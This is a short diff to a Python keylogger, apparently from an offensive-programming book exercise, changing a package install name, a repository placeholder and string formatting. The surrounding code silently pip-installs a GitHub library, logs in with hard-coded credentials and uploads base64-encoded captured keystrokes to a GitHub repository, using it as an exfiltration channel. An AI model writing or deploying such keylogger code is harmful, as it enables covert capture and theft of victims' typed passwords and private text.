@@ -14,7 +14,7 @@ try:
     from github3 import login
 except ModuleNotFoundError as e:
     try:
-        subprocess.check_output("python -m pip install github3 --user", shell=True)
+        subprocess.check_output("python -m pip install github3.py --user", shell=True)
         from github3 import login
     except Exception as e:
         raise e
@@ -44,14 +44,13 @@ class Logger():
         """Connect to github"""
         
         self.gh = login(username="yourusername", password="yourpassword")
-        self.repo = self.gh.repository("yourusername", "chapter_7")
+        self.repo = self.gh.repository("yourusername", "yourrepository")
         self.branch = self.repo.branch("master")
-
 
     def store_log(self):
         """Push results to github"""
         self.connect_to_github()
-        data_path = f"data/{self.id}/logger_{round(time.time())}.data"
+        data_path = "data/%s/logger_%d.data" % (self.id, round(time.time()))
         self.repo.create_file(data_path, "KeyStrokes", base64.b64encode(self.str_buffer.encode()))
         self.str_buffer = ""
 
